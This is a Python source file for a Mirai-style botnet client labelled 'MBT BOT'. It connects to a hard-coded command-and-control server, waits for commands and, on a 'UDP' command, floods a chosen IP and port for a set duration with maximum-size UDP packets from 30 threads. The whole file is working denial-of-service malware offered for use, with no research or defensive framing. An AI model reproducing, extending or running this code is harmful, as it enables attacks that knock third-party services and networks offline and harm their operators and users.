#!/usr/bin/env python3
"""
MBT BOT - MIRAI UDP FLOOD
Aggressive UDP flood, 30 threads for max power
"""

import socket
import threading
import time
import random
import sys

C2_HOST = "172.16.216.100"  # CHANGE THIS
C2_PORT = 1337

class MiraiBot:
    def __init__(self):
        self.running = True
        self.attacking = False
        
    def udp_flood(self, ip, port, duration):
        """Mirai-style UDP flood - 30 threads, max packet size"""
        print(f"[*] UDP FLOOD: {ip}:{port} for {duration}s")
        
        end_time = time.time() + duration
        
        def flood_worker(worker_id):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Max size UDP payload
                payloads = [
                    b"\x00" * 65500,
                    b"\xff" * 65500,
                    random.randbytes(65500),
                    b"A" * 65500,
                    b"X" * 65500
                ]
                
                while time.time() < end_time and self.attacking:
                    try:
                        payload = random.choice(payloads)
                        sock.sendto(payload, (ip, port))
                    except:
                        pass
                
                sock.close()
            except:
                pass
        
        # 30 threads for maximum aggression
        threads = []
        for i in range(30):
            t = threading.Thread(target=flood_worker, args=(i,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"[+] UDP FLOOD DONE: {ip}:{port}")
    
    def connect(self):
        retry = 3
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((C2_HOST, C2_PORT))
                print(f"[+] Connected to C2")
                s.send(b"BOT\n")
                
                while self.running:
                    try:
                        s.settimeout(5)
                        data = s.recv(1024)
                        if not data:
                            break
                        
                        cmd = data.decode().strip()
                        
                        if cmd == "PING":
                            s.send(b"PONG\n")
                        
                        elif cmd.startswith("UDP"):
                            parts = cmd.split()
                            if len(parts) == 4:
                                _, ip, port, dur = parts
                                self.attacking = True
                                self.udp_flood(ip, int(port), int(dur))
                                self.attacking = False
                                s.send(b"DONE\n")
                        
                        elif cmd == "STOP":
                            self.attacking = False
                            s.send(b"STOPPED\n")
                        
                    except socket.timeout:
                        s.send(b"PONG\n")
                        continue
                    except:
                        break
                    
                s.close()
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(retry)
                retry = min(retry * 2, 60)
        
        print("[*] Bot offline")

if __name__ == "__main__":
    print("\033[1;36m")
    print("+--------------------------------------+")
    print("|     MBT BOT - MIRAI 30-THREAD        |")
    print("|         #darkness #frosty2           |")
    print("+--------------------------------------+\033[0m")
    
    bot = MiraiBot()
    try:
        bot.connect()
    except KeyboardInterrupt:
        bot.running = False
        print("\n[!] Bot stopped")
